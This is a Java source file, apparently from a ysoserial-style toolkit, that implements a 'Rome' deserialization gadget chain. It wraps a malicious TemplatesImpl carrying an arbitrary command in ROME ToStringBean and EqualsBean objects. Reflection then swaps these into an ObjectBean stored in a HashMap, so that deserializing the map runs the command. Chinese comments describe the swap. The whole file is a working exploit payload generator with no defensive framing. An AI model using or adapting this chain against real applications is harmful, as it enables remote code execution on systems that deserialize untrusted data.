package org.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.gadget.inter.Gadget;
import org.util.TemplateUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Rome implements Gadget {
    @Override
    public Object getObject(String command, String path) throws Exception {
        TemplatesImpl tmpl = TemplateUtils.getTemplate(command, path);
        ToStringBean toStringBean = new ToStringBean(Templates.class, tmpl);
        EqualsBean equalsBean = new EqualsBean(toStringBean.getClass(), toStringBean);

        //先构造正常的ObjectBean对象，put进hashMap
        ObjectBean objectBean = new ObjectBean("".getClass(), "aaa");

        Map map = new HashMap<>();
        map.put(objectBean, "asdf");

        //将恶意的EqualsBean对象写入到ObjectBean的_equalsBean属性中
        Field equalsBean1 = objectBean.getClass().getDeclaredField("_equalsBean");
        equalsBean1.setAccessible(true);
        equalsBean1.set(objectBean, equalsBean);
        return map;
    }
}
